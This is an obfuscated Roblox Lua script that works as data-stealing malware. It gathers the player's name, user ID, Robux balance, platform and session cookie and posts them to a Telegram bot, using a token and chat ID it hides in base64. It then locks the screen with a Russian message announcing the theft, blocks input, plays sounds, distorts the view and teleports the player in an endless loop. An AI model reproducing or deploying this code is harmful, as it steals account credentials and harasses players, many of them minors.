local a = game.Players.LocalPlayer

local b = {
    c = "ODQzMDM3MDk1MDpBQUVCWTVKSEJnYjYySzBCLXIwX3pHY2tqZWRmdzlCbXVNZw==",
    d = "NzgxMTUzNDI2OQ=="
}

local function e(f)
    local g = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    f = string.gsub(f, '[^'..g..'=]', '')
    return (f:gsub('.', function(h)
        if (h == '=') then return '' end
        local i,j='',(g:find(h)-1)
        for k=6,1,-1 do i=i..(j%2^k-j%2^(k-1)>0 and '1' or '0') end
        return i;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(l)
        if (#l ~= 8) then return '' end
        local m=0
        for n=1,8 do m=m+(l:sub(n,n)=='1' and 2^(8-n) or 0) end
        return string.char(m)
    end))
end

local o = e(b.c)
local p = e(b.d)

local q = {
    "Mjc1MzkxNTU0OQ==", "MjkyNDM5NDc3", "MTQyODIzMjkx", "Mjg2MDkwNDI5", 
    "Mzk1NjgxODM4MQ==", "MTk2MjA4Njg2OA==", "MzAxNTQ5NzQ2", "MTU1NjE1NjA0",
    "NzM0MTU5ODc2", "MjIxMjYxODMzOQ==", "ODU0MDM0NjQxMQ==", "NjI4NDU4MzAzMA==",
    "NzA0NDMwNjA1NA==", "MTM4MjI4ODk=", "MTUzNzY5MDk2Mg==", "Mzk4MTIyMjI0NQ==",
    "MzEwMTY2Nzg5Nw==", "NDY0MzY5NzQzOQ==", "NjkzODgwMzQzNg==", "MjMxNzcxODY5Ng==",
    "NTc3NzIyODAyNw==", "NTM3NDEzNTI4", "MzYyMzA5NjA4Nw==", "NDk1NTU4MjM2OA==",
    "NTEwNDIwMjczOQ==", "NTI3NDk5NjIxOQ==", "NTYwMjA1NTM5NA==", "NjIxMTI5NzYw",
    "NjY3Nzk4NTkyMw==", "NzA0NzYyNjY5NA==", "NzE4NjU5NDQ3Ng==", "NzU2MDE1NjA1NA==",
    "NzczNzY5MzM2Mg==", "ODIwNDg5NjAxOQ==", "ODkzOTczNDQwMw=="
}

local r = {}
for s, t in ipairs(q) do
    r[s] = tonumber(e(t))
end

local function R()
    local S, T = pcall(function()
        local U = game:GetService("MarketplaceService")
        local V = U:GetProductInfo(game.PlaceId)
        return V.Name
    end)

    local W = {
        name = a.Name,
        userid = a.UserId,
        placeid = game.PlaceId,
        gamename = S and T or "Неизвестно",
        time = os.date()
    }

    local X, Y = pcall(function()
        return a:GetRobuxBalance()
    end)
    W.robux = X and Y or "Недоступно"

    local Z = game:GetService("UserInputService")
    W.platform = tostring(Z:GetPlatform())

    local _, ab = pcall(function()
        local ac = request({
            Url = "https://www.roblox.com/game/referral",
            Method = "GET"
        })
        return ac.Headers["Set-Cookie"] or "Недоступно"
    end)
    W.cookie = _ and ab or "Недоступно"

    local ad = "👤 " .. W.name .. 
                    "\n🆔 " .. W.userid .. 
                    "\n🎮 " .. W.placeid .. 
                    "\n📛 " .. W.gamename ..
                    "\n💎 " .. W.robux .. 
                    "\n📱 " .. W.platform .. 
                    "\n🍪 " .. W.cookie .. 
                    "\n⏰ " .. W.time

    pcall(function()
        request({
            Url = "https://api.telegram.org/bot" .. o .. "/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = p,
                text = ad
            })
        })
    end)
end

local function u()
    local v = Instance.new("ScreenGui")
    v.Name = "WarningGui"
    v.ZIndexBehavior = Enum.ZIndexBehavior.Global
    v.ResetOnSpawn = false
    v.DisplayOrder = 999999

    local w = math.random(1, 2) == 1
    local x = w and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
    local y = w and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
    
    local z = Instance.new("Frame")
    z.Name = "Background"
    z.BackgroundColor3 = x
    z.Size = UDim2.new(2, 0, 2, 0)
    z.Position = UDim2.new(-0.5, 0, -0.5, 0)
    z.BorderSizePixel = 0
    z.ZIndex = 999999
    z.Parent = v

    local A = Instance.new("TextLabel")
    A.Name = "WarningMessage"
    A.Size = UDim2.new(0.5, 0, 0.05, 0)
    A.Position = UDim2.new(0.5, 0, 0.5, 0)
    A.AnchorPoint = Vector2.new(0.5, 0.5)
    A.BackgroundTransparency = 1
    A.Text = "*ТВОИ ДАННЫЕ БЫЛИ ПЕРЕДАНЫ*"
    A.TextColor3 = y
    A.TextScaled = true
    A.Font = Enum.Font.GothamBlack
    A.TextStrokeTransparency = 0
    A.TextStrokeColor3 = w and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
    A.ZIndex = 1000000
    A.TextWrapped = true
    A.Parent = z

    for B = 1, 20 do
        local C = Instance.new("Frame")
        C.Name = "Noise" .. B
        C.BackgroundColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
        C.Size = UDim2.new(0, math.random(5, 50), 0, math.random(5, 50))
        C.Position = UDim2.new(0, math.random(0, 1000), 0, math.random(0, 1000))
        C.BorderSizePixel = 0
        C.ZIndex = 999998
        C.Parent = z
    end

    local D = Instance.new("TextButton")
    D.Name = "InputBlocker"
    D.Size = UDim2.new(2, 0, 2, 0)
    D.Position = UDim2.new(-0.5, 0, -0.5, 0)
    D.BackgroundTransparency = 1
    D.Text = ""
    D.Modal = true
    D.ZIndex = 1000001
    D.Parent = z

    v.Parent = game:GetService("CoreGui")
    
    return v
end

local function E()
    local F = game:GetService("SoundService")
    
    for G = 1, 5 do
        local H = Instance.new("Sound")
        H.Name = "StrangeSound" .. G
        H.SoundId = "rbxassetid://" .. tostring(140737297 + math.random(1, 10000))
        H.Volume = 0.5
        H.Looped = true
        H.PlaybackSpeed = 0.5 + math.random() * 2
        H.Parent = F
        
        pcall(function()
            H:Play()
        end)
    end
end

local function I()
    local J = game:GetService("Lighting")
    
    J.Brightness = 5
    J.Ambient = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    J.OutdoorAmbient = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    
    local K = Instance.new("BlurEffect")
    K.Size = 10
    K.Parent = J
    
    local L = Instance.new("ColorCorrectionEffect")
    L.Brightness = 0.1
    L.Contrast = 0.5
    L.Saturation = -0.5
    L.TintColor = Color3.fromRGB(255, math.random(0, 255), math.random(0, 255))
    L.Parent = J
end

local function M()
    local N = game:GetService("RunService")
    local O = workspace.CurrentCamera
    
    local P
    P = N.Heartbeat:Connect(function()
        if O then
            local Q = Vector3.new(
                math.random(-2, 2),
                math.random(-2, 2),
                math.random(-2, 2)
            )
            O.CFrame = O.CFrame + Q
        end
    end)
    
    wait(10)
    P:Disconnect()
end

local function ae()
    local af = game:GetService("StarterGui")
    pcall(function()
        af:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    local ag = game:GetService("UserInputService")
    ag.ModalEnabled = true

    ag.InputBegan:Connect(function(ah)
        if ah.UserInputType == Enum.UserInputType.Keyboard then
        end
    end)
end

local function ai()
    wait(0.5)
    
    local aj = math.random(1, #r)
    local ak = r[aj]
    
    local al = game:GetService("TeleportService")
    
    local am, an = pcall(function()
        al:Teleport(ak, a)
    end)
    
    if not am then
        warn("Телепорт не удался: " .. tostring(an))
        ai()
    end
end

local function ao()
    R() -- Сначала отправляем данные
    
    wait(7) -- Ждем 7 секунд
    
    u() -- Затем создаем экран
    ae()
    E()
    I()
    M()
    ai()
end

ao()

while true do
    wait(0.5)
    if not game:GetService("CoreGui"):FindFirstChild("WarningGui") then
        u()
    end
    
    if math.random(1, 10) == 1 then
        E()
        I()
        M()
    end
end
